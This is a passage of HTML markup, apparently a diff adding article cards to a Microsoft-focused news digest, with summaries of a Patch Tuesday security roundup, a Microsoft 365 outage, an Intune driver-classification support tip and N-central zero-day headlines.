+          <a href="https://news.google.com/rss/articles/CBMikgFBVV95cUxNanNzTXBHOGNvdHFnTnFCSDZianlGbzBGczA1Yy0yYTlXMEpWVHgzYkhPakJmZnlNeEQ0eEJJREIwc3hJcy1icUZ5d0R1UktYNUxxckJMRTdIYTE0U3JSQVQ2Z2Nvek5fUlRIUHdVQXBzUng4SzBGb3RsdzZITmFPR2tKcHZjREJ1WmVaOENHcjYzUQ?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Ohio State, Microsoft launch five-year AI and cloud partnership reportedly valued at $250 million - Ohio Tech News</a>
+          <div class="article-meta">Ohio Tech News &bull; Nov 13, 2026</div>
+          <div class="article-summary snippet"><p>Ohio State, Microsoft launch five-year AI and cloud partnership reportedly valued at $250 million&amp;nbsp;&amp;nbsp;Ohio Tech News</p><a href="https://news.google.com/rss/articles/CBMikgFBVV95cUxNanNzTXBHOGNvdHFnTnFCSDZianlGbzBGczA1Yy0yYTlXMEpWVHgzYkhPakJmZnlNeEQ0eEJJREIwc3hJcy1icUZ5d0R1UktYNUxxckJMRTdIYTE0U3JSQVQ2Z2Nvek5fUlRIUHdVQXBzUng4SzBGb3RsdzZITmFPR2tKcHZjREJ1WmVaOENHcjYzUQ?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a0a2a14108c')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+    </section>
+    <section id="sharepoint" class="topic-section">
+      <h2 class="topic-title" style="--c:#036C70">SharePoint <span class="count">(8)</span></h2>
+      <div class="article-card" data-id="a1847c39d5f">
+        <div class="article-body">
+          <a href="https://thehackernews.com/2026/11/microsoft-patches-1259-flaws-including.html" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft Patches 1,259 Flaws, Including Exploited Outlook Bug That May Expose NTLMv2 Hashes</a>
+          <div class="article-meta">thehackernews.com &bull; Nov 11, 2026</div>
+          <div class="article-summary"><p>Microsoft on Tuesday released patches for a total of 1,259 vulnerabilities spanning its software portfolio, the second consecutive month where the patch volume has exceeded 1,000 flaws.
+These cover 726 flaws in Windows, 174 in Office, 61 in Developer Tools, 59 in SQL Server, 53 in Developer Tools, and 27 in SharePoint Server. The patches also include 165 non-Microsoft-issued CVE identifiers. More than 500 flaws relate to elevation of privilege, followed by remote code execution and information disclosure bugs.
+With the latest round of fixes, Microsoft has addressed over 5,100 CVEs this year alone, according to Satnam Narang, senior staff research engineer at Tenable.
+Of these, a Moderate-severity security flaw in Microsoft Outlook (CVE-2026-124194, CVSS score: 6.5) has been flagged as actively exploited by Microsoft.
+&quot;Product UI does not warn users of unsafe actions in Microsoft Office Outlook allows an unauthorized attacker to perform spoofing over a network,&quot; Microsoft said in an advisory.
+An unauthenticated attacker could send a specially crafted message file and persuade a target to open it in an affected version of Microsoft Outlook.
+This, in turn, could cause Outlook to connect to an attacker-controlled network location without displaying the usual external-content warning, potentially disclosing authentication information, such as an NTLMv2 hash, that could be used to impersonate the user.
+Microsoft emphasized that successful exploitation requires network connectivity and user interaction. The tech giant credited a researcher named Nono and Anthropic's Benoît Sevens (using Claude) with discovering and reporting the flaw.
+&quot;Email is the easiest door into any company, and this flaw turns one opened file into a stolen identity,&quot; Jack Bicer, director of vulnerability research at Action1, said. &quot;A captured hash can let an attacker sign in as the victim, read their data, and move to other systems they can reach.&quot;
+&quot;The Moderate label undersells this one. Attackers are already exploiting it, it needs only one click on an email file, and it hits Outlook, which nearly every organization runs. A stolen hash can open doors far beyond the inbox.&quot;
+That said, Redmond has not attributed the activity to a particular threat actor or provided technical details on how the vulnerability is being exploited in the wild. The advisory also doesn't spell out whether the discovery came before or after attackers began exploiting the flaw.
+The development has prompted the U.S. U.S. Cybersecurity and Infrastructure Security Agency (CISA) to add the flaw to its Known Exploited Vulnerabilities (KEV) catalog, requiring federal agencies to apply the fix by November 24, 2026.
+Some other vulnerabilities of note include a number of remote code execution flaws impacting Windows Search (CVE-2026-116928), Lightweight Directory Access Protocol (CVE-2026-119958), Windows Schannel (CVE-2026-119952), Windows Virtual Filtering Platform (CVE-2026-95962), and Windows Xbox Live Networking Service (CVE-2026-112967), as well as a privilege escalation flaw in Azure OpenAI (CVE-2026-119990).
+&quot;Most security teams haven't quite recovered from the last month of bumper-to-bumper critical vulnerabilities, emergency patches, and '2shell'-branded everything, and we're yet again at another Patch Tuesday,&quot; Jake Knott, head of threat intelligence at watchTowr, said.
+&quot;Teams are really starting to feel the strain of working out 'what actually matters?' when there is fire after fire every day demanding immediate attention. Start with what you actually have exposed to the Internet, then what’s already being exploited in the wild, and only then everything else. Before going into panic mode, check whether you even use the vulnerable component, or meet the prerequisites for exploitation.&quot;</p></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a1847c39d5f')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a6cea255aae">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMi0AFBVV95cUxOSFJvczBPTzUzdDZOcUMxd1kyRlRwWWtlc3JFTVZVeWc0eFdBUmp2YWJyaGUydE5DNFJ3Sm10OFk5dWtOODZNT2ZpcW8xU1JsQ2VEb1B0WFctOUNTQzUwbmJRRUtld3lJMnpzRmFoYW9FVFVEX05VZklLWlpOTTRlOG1fYlZ5QS1KbExobWtIUGR5M0hfMmhMOWktMFpwU18yZnVIMjhrdVdLUGphN3ZEVVl6VkFxS19WdXhjVzZSZFFlc3o2TllkOGxWZDh0VzVu?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft 365 outage: Disruption continues with issues spanning Copilot, Exchange, and SharePoint - IT Pro</a>
+          <div class="article-meta">IT Pro &bull; Nov 13, 2026</div>
+          <div class="article-summary snippet"><p>Microsoft 365 outage: Disruption continues with issues spanning Copilot, Exchange, and SharePoint&amp;nbsp;&amp;nbsp;IT Pro</p><a href="https://news.google.com/rss/articles/CBMi0AFBVV95cUxOSFJvczBPTzUzdDZOcUMxd1kyRlRwWWtlc3JFTVZVeWc0eFdBUmp2YWJyaGUydE5DNFJ3Sm10OFk5dWtOODZNT2ZpcW8xU1JsQ2VEb1B0WFctOUNTQzUwbmJRRUtld3lJMnpzRmFoYW9FVFVEX05VZklLWlpOTTRlOG1fYlZ5QS1KbExobWtIUGR5M0hfMmhMOWktMFpwU18yZnVIMjhrdVdLUGphN3ZEVVl6VkFxS19WdXhjVzZSZFFlc3o2TllkOGxWZDh0VzVu?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a6cea255aae')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a3bc64f96ec">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMiuwFBVV95cUxOdFdmdzlmTVdnd3BVMjUzQ0YycGo1dHNpVDhUc3RGX3NyaTFVb1d3M2xhekp1NnFLcUJKU0lJMjBMcXJpT0dkZW1Sc0xoem9wRXQ0dGFSN0twRXltNWJYLUJIU212SUFCUk4wOEhkQkFWX3gyZDJIMTV5YmxtUWVjVWZ2bmpxUDdjRkFvVVZaLWxHVGx5b2Z5YXpMT1ppUHJJblVLSVpzY3diSHowN3YzVll5eGoxUjI5bjFB?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">What’s new in Power Platform: October/November 2026 feature update - Microsoft</a>
+          <div class="article-meta">Microsoft &bull; Nov 10, 2026</div>
+          <div class="article-summary snippet"><p>What’s new in Power Platform: October/November 2026 feature update&amp;nbsp;&amp;nbsp;Microsoft</p><a href="https://news.google.com/rss/articles/CBMiuwFBVV95cUxOdFdmdzlmTVdnd3BVMjUzQ0YycGo1dHNpVDhUc3RGX3NyaTFVb1d3M2xhekp1NnFLcUJKU0lJMjBMcXJpT0dkZW1Sc0xoem9wRXQ0dGFSN0twRXltNWJYLUJIU212SUFCUk4wOEhkQkFWX3gyZDJIMTV5YmxtUWVjVWZ2bmpxUDdjRkFvVVZaLWxHVGx5b2Z5YXpMT1ppUHJJblVLSVpzY3diSHowN3YzVll5eGoxUjI5bjFB?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a3bc64f96ec')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a7b4cbfa002">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMifEFVX3lxTE8zWVd0VTRLTkFhaHlDLTNmZUNmLXkzd3ZLQVBULVd3Wk5GTDBPNzA1TkRGSmlzM0NlTURMX01hdmZHSHE2SW1zbE5OTE80ZjhfX1BZMTFJY2pyUGJjYktrVEJzT0VGelQxQmE5RjhlZkxEcjUwQ21KWnRTZS0?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft apologizes for massive outage that took down Outlook and other 365 services - CNBC</a>
+          <div class="article-meta">CNBC &bull; Nov 12, 2026</div>
+          <div class="article-summary snippet"><p>Microsoft apologizes for massive outage that took down Outlook and other 365 services&amp;nbsp;&amp;nbsp;CNBC</p><a href="https://news.google.com/rss/articles/CBMifEFVX3lxTE8zWVd0VTRLTkFhaHlDLTNmZUNmLXkzd3ZLQVBULVd3Wk5GTDBPNzA1TkRGSmlzM0NlTURMX01hdmZHSHE2SW1zbE5OTE80ZjhfX1BZMTFJY2pyUGJjYktrVEJzT0VGelQxQmE5RjhlZkxEcjUwQ21KWnRTZS0?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a7b4cbfa002')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="afb426f9d62">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMiogFBVV95cUxNUUZWOUNtNWFCM2JscG9FNzZHc1JVYzVPSmtUd2pUM05DVUNxSEtyTDBtN3IyYVpLRUJXdVhFNkFzcE0yZ1VDdUxLeWFwU2xmTkVjSGRfcUREbWVldTFoX1RibnhjUkFzRmVNcU9HOS1pVnlzOXVtUHo4TlRtMHZIcWQzZ1h4bENjN25Sd3ZOMkFRb3VqSGZBYUNQdTdjd1FYMVE?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft outage: company scrambles to fix global issue that took down Outlook and Teams - The Guardian</a>
+          <div class="article-meta">The Guardian &bull; Nov 13, 2026</div>
+          <div class="article-summary snippet"><p>Microsoft outage: company scrambles to fix global issue that took down Outlook and Teams&amp;nbsp;&amp;nbsp;The Guardian</p><a href="https://news.google.com/rss/articles/CBMiogFBVV95cUxNUUZWOUNtNWFCM2JscG9FNzZHc1JVYzVPSmtUd2pUM05DVUNxSEtyTDBtN3IyYVpLRUJXdVhFNkFzcE0yZ1VDdUxLeWFwU2xmTkVjSGRfcUREbWVldTFoX1RibnhjUkFzRmVNcU9HOS1pVnlzOXVtUHo4TlRtMHZIcWQzZ1h4bENjN25Sd3ZOMkFRb3VqSGZBYUNQdTdjd1FYMVE?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('afb426f9d62')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a696b8abea7">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMigwFBVV95cUxNc2lYOUlnY0UyU1hqLWJSR1J0RFlXeHlteW5XM2dxVXRNRDhzbXhjbXFEWVI1VVlDN3hiVjdwTG9tM3E3bS1UdHlEQTdTRnJMNWlxZzQ0a3RzTGZXU2huVUYyU3l1WjlEQmNHc1VlcDZzTFhQaDE4dmRBYXBWRXZNdG5pTQ?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft 365 outage affects university services - Nebraska Today</a>
+          <div class="article-meta">Nebraska Today &bull; Nov 13, 2026</div>
+          <div class="article-summary snippet"><p>Microsoft 365 outage affects university services&amp;nbsp;&amp;nbsp;Nebraska Today</p><a href="https://news.google.com/rss/articles/CBMigwFBVV95cUxNc2lYOUlnY0UyU1hqLWJSR1J0RFlXeHlteW5XM2dxVXRNRDhzbXhjbXFEWVI1VVlDN3hiVjdwTG9tM3E3bS1UdHlEQTdTRnJMNWlxZzQ0a3RzTGZXU2huVUYyU3l1WjlEQmNHc1VlcDZzTFhQaDE4dmRBYXBWRXZNdG5pTQ?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a696b8abea7')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a5ea2fc721d">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMilwFBVV95cUxPcl9PaWVnZV9jY01wZGltTWZSZTlhV3VwSjYyWElhMy1kTklTWk1hXzVvcEVqQU1VNFFhT0N1RWFaT3VIWk9NVUtUd3p5Rkw2WTAwMEM3RVRnem9uMURGQnpyckxvdGJSSVJrMHVHWXluYk56OWFVZWtSMUluRkROT3Z0dUJmdEh1V3N2aHpzc1dwa0Z5YjRZ?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Multiple Microsoft 365 Services Are Experiencing An Outage - Engadget</a>
+          <div class="article-meta">Engadget &bull; Nov 13, 2026</div>
+          <div class="article-summary snippet"><p>Multiple Microsoft 365 Services Are Experiencing An Outage&amp;nbsp;&amp;nbsp;Engadget</p><a href="https://news.google.com/rss/articles/CBMilwFBVV95cUxPcl9PaWVnZV9jY01wZGltTWZSZTlhV3VwSjYyWElhMy1kTklTWk1hXzVvcEVqQU1VNFFhT0N1RWFaT3VIWk9NVUtUd3p5Rkw2WTAwMEM3RVRnem9uMURGQnpyckxvdGJSSVJrMHVHWXluYk56OWFVZWtSMUluRkROT3Z0dUJmdEh1V3N2aHpzc1dwa0Z5YjRZ?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a5ea2fc721d')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a8a7e49435e">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMi0wFBVV95cUxOZlN0T0pkMktsc3hhNGZPdlZEY25fV1QwUGJYaU5RVDBEdks4YUk0OFZKZjFJVGlQTl9GUmVud0UybndSMlNlTmQxZjNBM1JEUWdTRm9mWGJaaTJ6eWVtRHZ0aHhPZFM4MU9IX3pFbGlmTVh4SDRGZUlBQ3gxeTBueGQ0UVRZYUJnNVgwVXcxVXpTOUZfYTZTbE1yaDRJX0JWbVlqeHp5UnhGNEZwNXllMGtkN0dST0pfZjlKTFFPSHB3Q2U0ZFBYV2NxSTdjTE13WndV?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft Outlook down? Millions report problems accessing email and other 365 apps - ClickOnDetroit | WDIV Local 4</a>
+          <div class="article-meta">ClickOnDetroit | WDIV Local 4 &bull; Nov 13, 2026</div>
+          <div class="article-summary snippet"><p>Microsoft Outlook down? Millions report problems accessing email and other 365 apps&amp;nbsp;&amp;nbsp;ClickOnDetroit | WDIV Local 4</p><a href="https://news.google.com/rss/articles/CBMi0wFBVV95cUxOZlN0T0pkMktsc3hhNGZPdlZEY25fV1QwUGJYaU5RVDBEdks4YUk0OFZKZjFJVGlQTl9GUmVud0UybndSMlNlTmQxZjNBM1JEUWdTRm9mWGJaaTJ6eWVtRHZ0aHhPZFM4MU9IX3pFbGlmTVh4SDRGZUlBQ3gxeTBueGQ0UVRZYUJnNVgwVXcxVXpTOUZfYTZTbE1yaDRJX0JWbVlqeHp5UnhGNEZwNXllMGtkN0dST0pfZjlKTFFPSHB3Q2U0ZFBYV2NxSTdjTE13WndV?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a8a7e49435e')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+    </section>
+    <section id="intune" class="topic-section">
+      <h2 class="topic-title" style="--c:#0F6CBD">Intune <span class="count">(6)</span></h2>
+      <div class="article-card" data-id="ad0430e9466">
+        <div class="article-body">
+          <a href="https://techcommunity.microsoft.com/t5/intune-customer-success/support-tip-why-windows-driver-recommendations-may-vary-between/ba-p/4572700" target="_blank" rel="noopener noreferrer" class="article-title">Support tip: Why Windows driver recommendations may vary between deployment rings</a>
+          <div class="article-meta">techcommunity.microsoft.com &bull; Nov 13, 2026</div>
+          <div class="article-summary"><p>By: Dorin Mardari – Sr Technical Support Engineer | Microsoft Intune
+Managing Windows driver updates across deployment rings might give results that seem inconsistent. You might expect the same update to behave the same way everywhere, but Windows Update evaluates updates separately for the devices in each ring. As a result, the update might appear under Recommended drivers in one ring and Other drivers in another, change classification over time, arrive at different times, or not appear at all even though the manufacturer's website lists it for your devices.
+In most cases, this behavior is expected. This article explains why it happens, what it means when you approve and deploy drivers, and how to tell expected behavior from a problem that needs Microsoft Support.
+For general information about driver update policies, approval modes, and the Recommended drivers and Other drivers lists, see:
+Where driver classifications come from
+Intune and Windows Autopatch don't decide whether a driver is recommended.
+- First, the publisher submits the driver. Many drivers are built by a component maker, such as a chipset, audio, or graphics vendor, but published to Windows Update by the original equipment manufacturer (OEM). The publisher decides which hardware the driver targets and whether it's marked as required. Only drivers marked as required can appear under Recommended drivers.
+- Windows Update then evaluates each device. Windows Update decides whether a driver applies, and how it ranks against other drivers that also apply. It bases this on the device's hardware IDs, currently installed drivers, the Windows version, and the publisher's targeting rules.
+- Finally, Intune shows the result for each policy. Each policy's driver list is built from the results for the devices assigned to it.
+Why the same driver can be listed differently in different rings
+A driver isn't classified once for your whole tenant. Instead, it's classified for each policy (ring), based on the devices in that policy. Two devices can get different results for the same driver depending on their model, already installed drivers, and Windows version, even within the same ring. When the devices are in different rings, each ring can show the driver differently. This is especially common for drivers that apply to several device models.
+One device can change how the whole ring shows a driver
+If a driver is recommended for at least one device in a policy, the policy shows it under Recommended drivers, even if it's only optional for the other devices.
+Example:
+- Ring A contains Device 1 and Device 2. The driver is recommended for Device 1 and optional for Device 2, so Ring A shows the driver under Recommended drivers.
+- Ring B contains only devices like Device 2, so Ring B shows the same driver under Other drivers.
+Both rings can be managed the same way and contain similar hardware, but they show different results because of one device.
+Changes can apply to only some devices
+Each driver published to Windows Update has a unique UpdateID. You can find it in the driver's Update Details in the Microsoft Update Catalog. The same driver name and version can be published several times, for example for different devices or components, or with different requirements. Each of these publications is a separate update with its own UpdateID.
+Windows Update can also deliver one update to several groups of devices, called flights. Flights are based on details such as the manufacturer, hardware, installed drivers, and Windows version. During a driver's rollout, Windows Update can change how the driver is ranked, for example from optional to recommended.</p></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('ad0430e9466')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a9f981ffc76">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMizwFBVV95cUxQNGRhMFN3YUpjU3dzbXdTUHdLNXNqT2NoclJjLTV0M3pRMTktbjZxbzBvY2dLVGgtbUNPaUdUUXdFNTg5blNKZmxnQUgtX08zWDZYU1psaVlIb1R2UGUxel9WUWEzbnhFR0tDMDhNbm5iaEVvajFVdjBmT2ZHMHpBZFBVa1ExVDlqRDY4RllIZzI1MlA0TkUwbU0xejJDU3k5S2pwY3ctYVE5YzVKd09aMFl6bWRCQTFMN3kxQXgwbUtGZ3h5dmF3dE5ZQURqZ1U?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft struggling to fix massive cloud outage that's taken down email and Intune - The Register</a>
+          <div class="article-meta">The Register &bull; Nov 12, 2026</div>
+          <div class="article-summary snippet"><p>Microsoft struggling to fix massive cloud outage that's taken down email and Intune&amp;nbsp;&amp;nbsp;The Register</p><a href="https://news.google.com/rss/articles/CBMizwFBVV95cUxQNGRhMFN3YUpjU3dzbXdTUHdLNXNqT2NoclJjLTV0M3pRMTktbjZxbzBvY2dLVGgtbUNPaUdUUXdFNTg5blNKZmxnQUgtX08zWDZYU1psaVlIb1R2UGUxel9WUWEzbnhFR0tDMDhNbm5iaEVvajFVdjBmT2ZHMHpBZFBVa1ExVDlqRDY4RllIZzI1MlA0TkUwbU0xejJDU3k5S2pwY3ctYVE5YzVKd09aMFl6bWRCQTFMN3kxQXgwbUtGZ3h5dmF3dE5ZQURqZ1U?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a9f981ffc76')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="ad80c09653e">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMiqwFBVV95cUxQNEFKRGFfR0xMZUJmR25FNE5FcGJ5aEJhdzJlLV8wQnROaVlFZWdUdFNvNndUUTdCWTU5TUt5LTNsbnNodGxaRWc3ZlZUN2tmd2pqTnI3V1ZHTEtsWFh6V3FnOHhwRTdDVTRGcldIc21aaHh4OUdrQ3gwRzNJRzhCUVRMbVNzb2dxbjZRdHNRQWYzV1ROSENJSG1BQWhjQ2p5WFcwb2hUN3lpOVk?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Global Microsoft outage leaves users open to phishing attacks - Computer Weekly</a>
+          <div class="article-meta">Computer Weekly &bull; Nov 13, 2026</div>
+          <div class="article-summary snippet"><p>Global Microsoft outage leaves users open to phishing attacks&amp;nbsp;&amp;nbsp;Computer Weekly</p><a href="https://news.google.com/rss/articles/CBMiqwFBVV95cUxQNEFKRGFfR0xMZUJmR25FNE5FcGJ5aEJhdzJlLV8wQnROaVlFZWdUdFNvNndUUTdCWTU5TUt5LTNsbnNodGxaRWc3ZlZUN2tmd2pqTnI3V1ZHTEtsWFh6V3FnOHhwRTdDVTRGcldIc21aaHh4OUdrQ3gwRzNJRzhCUVRMbVNzb2dxbjZRdHNRQWYzV1ROSENJSG1BQWhjQ2p5WFcwb2hUN3lpOVk?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('ad80c09653e')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a0858a1deac">
+        <div class="article-body">
+          <a href="https://petri.com/microsoft-deploys-patch-stabilize-microsoft-365-outage/" target="_blank" rel="noopener noreferrer" class="article-title">[Updated] Microsoft Deploys Configuration Patch to Stabilize Global Microsoft 365 Outage - Petri IT Knowledgebase</a>
+          <div class="article-meta">Petri IT Knowledgebase &bull; Nov 13, 2026</div>
+          <div class="article-summary"><p>Microsoft is gradually stabilizing its cloud infrastructure after an internal capacity cascade knocked carious Microsoft 365 services offline worldwide, forcing hospitals, emergency services, and enterprises onto manual backups while IT admins await full service restoration and audit delayed mail and security alerts.</p></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a0858a1deac')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a5ea2fc721d">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMilwFBVV95cUxPcl9PaWVnZV9jY01wZGltTWZSZTlhV3VwSjYyWElhMy1kTklTWk1hXzVvcEVqQU1VNFFhT0N1RWFaT3VIWk9NVUtUd3p5Rkw2WTAwMEM3RVRnem9uMURGQnpyckxvdGJSSVJrMHVHWXluYk56OWFVZWtSMUluRkROT3Z0dUJmdEh1V3N2aHpzc1dwa0Z5YjRZ?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Multiple Microsoft 365 Services Are Experiencing An Outage - Engadget</a>
+          <div class="article-meta">Engadget &bull; Nov 13, 2026</div>
+          <div class="article-summary snippet"><p>Multiple Microsoft 365 Services Are Experiencing An Outage&amp;nbsp;&amp;nbsp;Engadget</p><a href="https://news.google.com/rss/articles/CBMilwFBVV95cUxPcl9PaWVnZV9jY01wZGltTWZSZTlhV3VwSjYyWElhMy1kTklTWk1hXzVvcEVqQU1VNFFhT0N1RWFaT3VIWk9NVUtUd3p5Rkw2WTAwMEM3RVRnem9uMURGQnpyckxvdGJSSVJrMHVHWXluYk56OWFVZWtSMUluRkROT3Z0dUJmdEh1V3N2aHpzc1dwa0Z5YjRZ?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a5ea2fc721d')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a86b59400e0">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMiiwFBVV95cUxOaFlJU3U5X2pwMEcydmpOQWsyX2YtTWlyNDlFNmJ2TUxINnVWN002VE1SeDhMV05TWVYwS0ZnYUZNUjNLY05xVTVEam5MU0FFRmZXRFc3WUxXM2lyeE8tR1JreHlVbjFOLUxOejIxZWk2aXVGOXRidHNuMFpMR05VTGJfMXRDQUV2bUhN?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft Makes Windows Hello PINs Less Frustrating and Adds a Smarter Way to Lock Lost PCs - WinCentral</a>
+          <div class="article-meta">WinCentral &bull; Nov 14, 2026</div>
+          <div class="article-summary snippet"><p>Microsoft Makes Windows Hello PINs Less Frustrating and Adds a Smarter Way to Lock Lost PCs&amp;nbsp;&amp;nbsp;WinCentral</p><a href="https://news.google.com/rss/articles/CBMiiwFBVV95cUxOaFlJU3U5X2pwMEcydmpOQWsyX2YtTWlyNDlFNmJ2TUxINnVWN002VE1SeDhMV05TWVYwS0ZnYUZNUjNLY05xVTVEam5MU0FFRmZXRFc3WUxXM2lyeE8tR1JreHlVbjFOLUxOejIxZWk2aXVGOXRidHNuMFpMR05VTGJfMXRDQUV2bUhN?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a86b59400e0')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+    </section>
+    <section id="entraid" class="topic-section">
+      <h2 class="topic-title" style="--c:#6B69D6">Entra ID <span class="count">(7)</span></h2>
+      <div class="article-card" data-id="a10a1ecc934">
+        <div class="article-body">
+          <a href="https://petri.com/microsoft-entra-governance-ai-agents-guest-users/" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft Expands Entra Governance and Access Controls for AI Agents and Guest Users</a>
+          <div class="article-meta">petri.com &bull; Nov 12, 2026</div>
+          <div class="article-summary"><p>Microsoft is adding new governance, authentication, and access-control capabilities to Entra to help organizations manage users, guest accounts, and AI agents more effectively. The updates aim to reduce identity sprawl and security risks, though administrators will need to review policies and configurations before deployment.</p></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a10a1ecc934')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="ae1416630e0">
+        <div class="article-body">
+          <a href="https://www.bleepingcomputer.com/news/security/new-n-able-4everable2shell-zero-day-exploited-hours-after-poc-released/" target="_blank" rel="noopener noreferrer" class="article-title">New N-able &quot;4EverAble2Shell&quot; zero-day exploited hours after PoC released</a>
+          <div class="article-meta">bleepingcomputer.com &bull; Nov 12, 2026</div>
+          <div class="article-summary snippet"><p>Hackers are actively exploiting a newly disclosed N-able N-central zero-day vulnerability dubbed &quot;4EverAble2Shell&quot; to compromise servers and deploy cryptocurrency miners, with researchers reporting at least 21 affected systems, including 19 running the company's latest security update. [...]</p><a href="https://www.bleepingcomputer.com/news/security/new-n-able-4everable2shell-zero-day-exploited-hours-after-poc-released/" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('ae1416630e0')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a5ef31f54b9">
+        <div class="article-body">
+          <a href="https://thehackernews.com/2026/11/hackers-exploit-n-central-flaws-to.html" target="_blank" rel="noopener noreferrer" class="article-title">Hackers Exploit N-central Flaws to Infect 21 Servers, Including 19 Running Hotfix 2</a>
+          <div class="article-meta">thehackernews.com &bull; Nov 13, 2026</div>
